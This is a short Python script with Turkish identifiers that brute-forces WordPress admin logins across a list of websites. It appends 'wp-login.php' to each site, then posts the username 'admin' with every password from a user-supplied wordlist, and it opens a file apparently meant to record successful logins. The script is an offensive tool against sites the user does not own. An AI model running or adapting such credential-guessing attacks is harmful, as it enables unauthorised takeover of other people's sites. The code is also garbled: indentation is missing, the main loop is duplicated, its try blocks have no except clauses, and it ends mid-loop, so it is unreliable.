import requests
kullaniciadi=['admin']
girilesiteler=open("girilemteler.txt","w")
def bruteforce():
print("Default Kullanici Adi admin'dir.\n")
try:
dizin = input("Sifre Wordlist")
siteler = []
oku = open("siteler.txt", "r")
sitelerioku = oku.readlines()
sifrelerr = []
sifrelerioku = open(dizin, "r")
sifreoku = sifrelerioku.readlines()
for i in sifreoku:
sifrelerr.append(i.replace("\n", ""))
for websiteleri in sitelerioku:
siteler.append(websiteleri.replace("\n", "") + "wp-login.php")
print("Bütün Siteler Eklendi!\n")
for x in siteler:
for i in sifrelerr:
try:
payload = {'log': kullaniciadi, 'pwd': i}
r = requests.get(x, timeout=4)
if r.status_code == 200 and "pwd" in r.text:
r = requests.post(x, data=payload, timeout=4)
for x in siteler:
for i in sifrelerr:
try:
payload = {'log': kullaniciadi, 'pwd': i}
r = requests.get(x, timeout=4)
if r.status_code == 200 and "pwd" in r.text:
r = requests.post(x, data=payload, timeout=4)
